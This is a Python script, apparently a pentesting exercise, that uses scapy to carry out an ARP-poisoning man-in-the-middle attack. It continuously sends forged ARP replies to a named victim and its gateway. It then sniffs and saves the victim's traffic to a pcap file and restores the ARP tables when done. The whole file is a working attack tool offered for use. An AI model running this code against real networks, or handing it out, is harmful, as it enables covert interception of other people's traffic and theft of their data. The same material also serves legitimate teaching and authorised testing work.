import os
import sys
import time
from multiprocessing import Process

from scapy.all import (
    ARP,
    Ether,
    Packet,
    conf,
    get_if_hwaddr,
    send,
    sndrcv,
    sniff,
    srp,
    wrpcap,
)


def get_mac(target_ip) -> str|None:
    packet : Packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim : str, gateway : str, interface : str ='en0') -> None:
        self.interface : str = interface
        conf.iface = interface
        conf.verb = 0
        self.victim : str = victim
        self.victimmac : str|None = get_mac(victim)
        self.gateway : str  = gateway
        self.gatewaymac : str|None = get_mac(gateway)

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at ({self.gatewaymac}).')
        print(f'Gateway ({victim}) is at ({self.victimmac}).')
        print('-' * 30)

    def run(self) -> None:
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self) -> None:
        poison_victim : ARP = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-' * 30)

        poison_gateway : ARP = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)
        print('Beginning the ARP poison. [CTRL-C] to stop!')

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                return
            else:
                time.sleep(2)

    def sniff(self, count=200) -> None:
        time.sleep(5)
        print(f'Sniffing {count} packets.')

        bpf_filter = f'ip host {self.victim}'

        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)

        wrpcap('arper.pcap', packets)
        print('Got the packets!')

        self.restore()
        self.poison_thread.terminate()
        print('Finished!')


    def restore(self):
        print('Restoring ARP tables...')

        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)

def main() -> None:
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()


if __name__ == '__main__':
    main()
